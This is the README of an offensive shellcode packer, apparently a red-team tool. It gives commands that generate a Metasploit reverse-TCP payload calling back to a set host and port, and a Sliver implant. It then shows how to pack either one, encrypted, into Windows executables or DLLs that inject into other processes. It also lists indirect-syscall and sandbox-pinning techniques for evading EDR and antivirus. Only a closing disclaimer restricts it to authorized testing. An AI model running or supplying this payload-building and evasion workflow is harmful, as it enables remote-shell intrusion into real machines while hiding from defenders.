<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
</h1>

## Overview

RustPacker is a template-based shellcode packer designed for penetration testers and red team operators. It converts raw shellcode into Windows executables or DLLs using various injection techniques and evasion methods.

### Key Features

- **Multiple Injection Templates**: Choose from various injection techniques (CRT, APC, Fibers, etc.)
- **Encryption Support**: XOR and AES encryption for payload obfuscation
- **Syscall Evasion**: Indirect syscalls to bypass EDR/AV detection
- **Flexible Output**: Generate both EXE and DLL files
- **Cross-Platform**: Works on any OS with Docker/Podman support
- **Framework Compatible**: Works with Metasploit, Sliver, and custom shellcode

## Quick Start

### Using Docker/Podman (Recommended)

```bash
# Place your shellcode file in the shared folder
cp your_shellcode.raw shared/

# Build the container
podman build -t rustpacker .

# runtime
podman run -it --name rustpacker -d rustpacker

# Pack your shellcode example - see options for more details
podman exec -it rustpacker RustPacker \
  -f /usr/src/RustPacker/shared/<your_shellcode>.raw \
  -i ntcrt \
  -e aes \
  -b exe \
  -t <somefilename>.exe or .dll

# grab packed shellcode
podman cp rustpacker:/usr/src/RustPacker/shared .

# teardown
podman stop rustpacker
podman system prune -a
```

## Usage Examples

### Generate Shellcode

**Metasploit (msfvenom):**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o payload.raw
```

**Sliver:**
```bash
# In Sliver console
generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
```

### Packing Examples

**Basic EXE with AES encryption:**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
```

**DLL with XOR encryption:**
```bash
rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
```

**Custom output location:**
```bash
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -o shared/custom_name.exe
```

## Available Templates

| Template | Description | Injection Method | Syscalls |
|----------|-------------|------------------|----------|
| `wincrt` | High-level Windows API injection | Remote Process | ❌ |
| `ntcrt` | Low-level NT API injection | Remote Process | ❌ |
| `syscrt` | Indirect syscalls injection | Remote Process | ✅ |
| `ntapc` | APC-based execution | New Process | ❌ |
| `winfiber` | Fiber-based execution | Current Process | ❌ |
| `ntfiber` | NT API + Fiber execution | Current Process | ❌ |
| `sysfiber` | Indirect syscalls + Fiber execution | Current Process | ✅ |

### Template Details

**Process Injection Templates:**
- Use with `-t <process_name>` to specify target process
- Default target: `dllhost.exe`
- Compatible with: `wincrt`, `ntcrt`, `syscrt`

**Self-Execution Templates:**
- Execute shellcode within the packed binary
- Compatible with: `ntapc`, `winfiber`, `ntfiber`, `sysfiber`

## Command Line Options

```
RustPacker [OPTIONS]

OPTIONS:
    -f, --file <FILE>           Input shellcode file (raw format)
    -i, --injection <TEMPLATE>  Injection template [wincrt|ntcrt|syscrt|ntapc|winfiber|ntfiber|sysfiber]
    -e, --encryption <TYPE>     Encryption method [xor|aes]
    -b, --binary <TYPE>         Output binary type [exe|dll]
    -t, --target <PROCESS>      Target process name (for injection templates)
    -s, --sandbox <DOMAIN>      Sandbox Domain Pinning (detonate only on specified domain)
    -o, --output <PATH>         Custom output path and filename
    -h, --help                  Print help information
    -V, --version               Print version information
```

## Detection Evasion

RustPacker implements several evasion techniques:

- **Indirect Syscalls**: Bypass user-mode hooks (syscrt, sysfiber templates)
- **Encryption**: XOR and AES payload encryption
- **Process Injection**: Hide execution in legitimate processes
- **Template Variety**: Multiple execution methods to avoid signatures
- **Rust Compilation**: Native binaries with reduced detection surface

## License & Legal Notice

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This tool is provided for **educational and authorized penetration testing purposes only**.

- Usage against targets without prior mutual consent is **illegal**
- Users are responsible for complying with all applicable laws
- Developers assume no liability for misuse or damages
- Only use in authorized environments with proper permission
